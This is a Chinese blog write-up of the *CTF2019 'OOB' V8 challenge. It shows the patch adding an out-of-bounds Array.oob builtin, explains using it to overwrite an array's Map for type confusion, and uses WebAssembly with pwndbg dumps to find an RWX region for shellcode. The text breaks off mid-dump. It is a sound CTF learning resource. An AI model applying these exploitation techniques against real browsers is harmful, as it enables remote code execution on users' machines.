<!-- build time:Wed Oct 30 2019 22:30:13 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="*CTF2019 OOB-v8 writeup"><meta name="keywords" content="v8,OOB"><meta name="author" content="Hpasserby"><meta name="copyright" content="Hpasserby"><title>*CTF2019 OOB-v8 writeup | Hpasserby</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?4e3b4e0b100ec31631e29622d1ef8014";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>!function(e,t,a,n,c,s,o){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,s=t.createElement(a),o=t.getElementsByTagName(a)[0],s.async=1,s.src=n,o.parentNode.insertBefore(s,o)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-136221440-1","auto"),ga("send","pageview")</script><link rel="dns-prefetch" href="http://ta.qq.com"><script>!function(){var t=document.createElement("script");t.src="https://tajs.qq.com/stats?sId=66194231";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()</script><script>var GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容:${query}"}},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"}}</script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#调试环境"><span class="toc-number">1.</span> <span class="toc-text">调试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用技巧"><span class="toc-number">3.1.</span> <span class="toc-text">利用技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内存布局"><span class="toc-number">3.1.1.</span> <span class="toc-text">内存布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类型混淆"><span class="toc-number">3.1.2.</span> <span class="toc-text">类型混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wasm"><span class="toc-number">3.1.3.</span> <span class="toc-text">wasm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用流程（方法一）"><span class="toc-number">3.2.</span> <span class="toc-text">利用流程（方法一）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用流程（方法二）"><span class="toc-number">3.3.</span> <span class="toc-text">利用流程（方法二）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/images/avatar.jpg"></div><div class="author-info__name text-center">Hpasserby</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Hpasserby/Hpasserby.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">19</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友情链接</div><a class="author-info-links__name text-center" href="http://pidanxu.github.io/">我eax大哥</a><a class="author-info-links__name text-center" href="https://redogwu.github.io/">wjllz师傅</a><a class="author-info-links__name text-center" href="https://hachp1.github.io/">HACHp1大佬</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image:url(/images/head.jpg)"><div id="page-header"><span class="pull-left"><a id="site-name" href="/">Hpasserby</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于</a></span></div><div id="post-info"><div id="post-title">*CTF2019 OOB-v8 writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-08-20</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/browser/">browser</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote><p>这是用来入门v8的一道很好的<a href="https://ctftime.org/task/8393" target="_blank" rel="noopener">CTF题目</a>，主要思路就是利用oob修改v8中JS对象的map，从而造成type confusion</p></blockquote><a id="more"></a><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><p>具体环境搭建步骤就不详述了，patch文件在<a href="https://github.com/Changochen/CTF/tree/master/2019/*ctf" target="_blank" rel="noopener">这里</a>下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">gclient sync</span><br><span class="line">git apply ../oob.diff</span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -c ./out.gn/x64.release</span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该题是出题人通过patch，在v8中添加了一个漏洞。所以先从diff文件入手</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f <span class="number">100644</span></span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ <span class="number">-1668</span>,<span class="number">6</span> +<span class="number">1668</span>,<span class="number">8</span> @@ <span class="keyword">void</span> Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"fill"</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">"oob"</span>,</span><br><span class="line">+                          Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"find"</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"findIndex"</span>,</span><br><span class="line">diff --git a/src/builtins/builtins-<span class="built_in">array</span>.cc b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">+++ b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);	<span class="comment">// 获取Array</span></span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());	<span class="comment">//获取数组元素</span></span><br><span class="line">+    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());	<span class="comment">//获取数组长度</span></span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>从diff文件中可以看出，出题人为一个Array对象添加了一个<code>oob</code>函数，具体实现在<code>ArrayOob</code>。接下来开始分析oob函数。</p><p>首先获取了参数的个数len，若个数大于2，则返回undefined</p><p>若参数个数为1，则返回下标为length的数组元素，显然这里造成了一个越界读取，访问到了数组后面的一个元素。即<code>read arr[length]</code></p><p>若参数个数为2，则将第二个参数值写入下标为length的元素，造成了越界写入。即 <code>arr[length] = arg</code></p><p>这里需要注意一点，在函数调用时，第一个参数始终为this指针，我们所提供的参数则是从第二个开始的。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2><h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>因为我们拥有一个越界访问一个元素的能力，那么这里我们需要搞清楚在Array element的后方是什么。</p><p>我们首先进行如下调试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>]</span><br><span class="line">d8&gt; %DebugPrint(arr)</span><br><span class="line">DebugPrint: <span class="number">0x831db04dd99</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x2b36a3c82ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x251f23191111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0831db04dd71</span> &lt;FixedDoubleArray[<span class="number">3</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">3</span></span><br><span class="line"> - properties: <span class="number">0x25361adc0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #length: 0x3860ab3401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0831db04dd71</span> &lt;FixedDoubleArray[<span class="number">3</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3.3</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="number">0x2b36a3c82ed9</span>: [<span class="built_in">Map</span>]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: <span class="number">0x2b36a3c82e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x3860ab340609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #1: 0x251f23191f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x251f23191eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     <span class="number">0x25361adc4ba1</span> &lt;<span class="built_in">Symbol</span>: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x2b36a3c82f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x251f23191111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="keyword">constructor</span>: 0x251f23190ec1 &lt;JSFunction Array (sfi = 0x3860ab34aca1)&gt;</span><br><span class="line"> - dependent code: 0x25361adc02c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/12gx 0x831db04dd99-1						// JSArray</span><br><span class="line">0x831db04dd98:	0x00002b36a3c82ed9	0x000025361adc0c71	// Map Properties</span><br><span class="line">0x831db04dda8:	0x00000831db04dd71	0x0000000300000000	// Elements Length</span><br><span class="line">0x831db04ddb8:	0x000025361adc0941	0x00000adc7d437082</span><br><span class="line">0x831db04ddc8:	0x6974636e7566280a	0x220a7b2029286e6f</span><br><span class="line">0x831db04ddd8:	0x6972747320657375	0x2f2f0a0a3b227463</span><br><span class="line">0x831db04dde8:	0x2065726f6d204120	0x6173726576696e75</span><br><span class="line">pwndbg&gt; x/12gx 0x831db04dd71-1						// Elements</span><br><span class="line">0x831db04dd70:	0x000025361adc14f9	0x0000000300000000	// Map Length</span><br><span class="line">0x831db04dd80:	0x3ff199999999999a	0x400199999999999a	// 1.1 2.2</span><br><span class="line">0x831db04dd90:	0x400a666666666666	0x00002b36a3c82ed9	// 3.3</span><br><span class="line">0x831db04dda0:	0x000025361adc0c71	0x00000831db04dd71</span><br><span class="line">0x831db04ddb0:	0x0000000300000000	0x000025361adc0941</span><br><span class="line">0x831db04ddc0:	0x00000adc7d437082	0x6974636e7566280a</span><br></pre></td></tr></table></figure><p>从地址很容易可以看出，在Elements的后面紧跟的就是JSArray对象的Map，布局如下图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Elements---&gt;+-------------+</span><br><span class="line">            |  MAP        +&lt;------+</span><br><span class="line">            +-------------+       |</span><br><span class="line">            |  Length     |       |</span><br><span class="line">            +-------------+       |</span><br><span class="line">            |  element#1  |       |</span><br><span class="line">            +-------------+       |</span><br><span class="line">            |  element#2  |       |</span><br><span class="line">            +-------------+       |</span><br><span class="line">            |     ...     |       |</span><br><span class="line">            +-------------+       |</span><br><span class="line">            |  element#N  |       |</span><br><span class="line"> JSArray---&gt;--------------+       |</span><br><span class="line">            |  MAP        |       |</span><br><span class="line">            +-------------+       |</span><br><span class="line">            |  Properties |       |</span><br><span class="line">            +-------------+       |</span><br><span class="line">            |  Elements   +-------+</span><br><span class="line">            +-------------+</span><br><span class="line">            |  Length     |</span><br><span class="line">            +-------------+</span><br><span class="line">            |     ...     |</span><br><span class="line">            +-------------+</span><br></pre></td></tr></table></figure><p>这意味着我们可以通过越界访问获取到Array对象的Map地址，同时还可以修改该地址。</p><p><strong>trick</strong>：在调试过程中会发现，Elements并不是始终紧邻JSArray的，有些时候两者会相距一段距离。在师傅们的wp中提到可以使用<code>splice</code>来使该布局稳定，例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>].splice(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>具体原理我没有查到相关资料。。可能只有等以后读了源码才知道吧</p><h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; a = [1.1, 2.2, 3.3]</span><br><span class="line">d8&gt; %DebugPrint(a)</span><br><span class="line">DebugPrint: 0x35fa7c80dd91: [JSArray]</span><br><span class="line"> - map: 0x1ce6487c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c3276151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x35fa7c80dd69 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">d8&gt; b = [&#123;&#125;, 2.2]</span><br><span class="line">d8&gt; %DebugPrint(b)</span><br><span class="line">DebugPrint: 0x35fa7c810531: [JSArray]</span><br><span class="line"> - map: 0x1ce6487c2f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c3276151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x35fa7c8104d9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在v8中，Map描述了一个对象的结构，它决定了如何解析对象中的数据。从以上调试信息中即可以看到<code>a</code>为<code>Map(PACKED_DOUBLE_ELEMENTS)</code>，而<code>b</code>为<code>Map(PACKED_ELEMENTS)</code></p><p>所以，若将一个存放对象的数组的Map修改为一个浮点型数组的Map，再次去读取该数组中的元素时，将会把其中的对象（指针）当做浮点型数据读取出来，这类操作就叫做类型混淆（type confusion）</p><p>在此题中，我们可以任意修改和读取JSArray对象的Map，则可以很容易的造成类型混淆。</p><h3 id="wasm"><a href="#wasm" class="headerlink" title="wasm"></a>wasm</h3><p>在v8利用中总是需要布置shellcode，那么在内存中找到一块具有RWX权限的区域将会十分有帮助。wasm(WebAssembly)详细概念就不在这介绍了，这里值得注意的是是用wasm可以在内存中开辟出一块RWX的内存空间。</p><p><a href="https://wasdk.github.io/WasmFiddle/" target="_blank" rel="noopener">这里</a>可以将C语言编写的代码转换为wasm格式。当然，编写的c语言代码不能够调用库函数（不然就可以直接写rce了），但是只要通过漏洞，将我们的shellcode覆盖到内存中wasm代码所在rwx区域即可。</p><p>下文将展示如何定位到rwx内存区域</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.js</span></span><br><span class="line"><span class="keyword">const</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7f</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0a</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x0b</span></span><br><span class="line">  ]); </span><br><span class="line"><span class="keyword">const</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code));</span><br><span class="line"><span class="keyword">const</span> wasm_func = wasm_instance.exports.a;</span><br><span class="line">%DebugPrint(wasm_instance);</span><br><span class="line"></span><br><span class="line">readline();</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; r --allow-natives-syntax ../../exps/OOB/test.js</span><br><span class="line">DebugPrint: <span class="number">0x3ac2ec75f721</span>: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: <span class="number">0x3e31257c9789</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0c416a70ac19</span> &lt;<span class="built_in">Object</span> map = <span class="number">0x3e31257cabd9</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x018f99940c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: <span class="number">0x0c416a70e421</span> &lt;Module map = <span class="number">0x3e31257c91e9</span>&gt;</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     <span class="number">0x18f99940000</span>      <span class="number">0x18f99980000</span> r--p    <span class="number">40000</span> <span class="number">0</span>      </span><br><span class="line">     <span class="number">0x2d98eee0000</span>      <span class="number">0x2d98eee1000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>	&lt;---RWX area</span><br><span class="line">     <span class="number">0x2d98eee1000</span>      <span class="number">0x2d9ceee0000</span> ---p <span class="number">3</span>ffff000 <span class="number">0</span>      </span><br><span class="line">     <span class="number">0xc416a700000</span>      <span class="number">0xc416a740000</span> rw-p    <span class="number">40000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x13f152180000</span>     <span class="number">0x13f1521c0000</span> rw-p    <span class="number">40000</span> <span class="number">0</span>      </span><br><span class="line">... </span><br><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x3ac2ec75f721</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x3ac2ec75f720</span>:	<span class="number">0x00003e31257c9789</span>	<span class="number">0x0000018f99940c71</span></span><br><span class="line"><span class="number">0x3ac2ec75f730</span>:	<span class="number">0x0000018f99940c71</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x3ac2ec75f740</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x3ac2ec75f750</span>:	<span class="number">0x000055eaa54b90a0</span>	<span class="number">0x0000018f99940c71</span></span><br><span class="line"><span class="number">0x3ac2ec75f760</span>:	<span class="number">0x000055eaa55474f0</span>	<span class="number">0x0000018f999404d1</span></span><br><span class="line"><span class="number">0x3ac2ec75f770</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x3ac2ec75f780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x3ac2ec75f790</span>:	<span class="number">0x000055eaa5547510</span>	<span class="number">0x0000018f999404d1</span></span><br><span class="line"><span 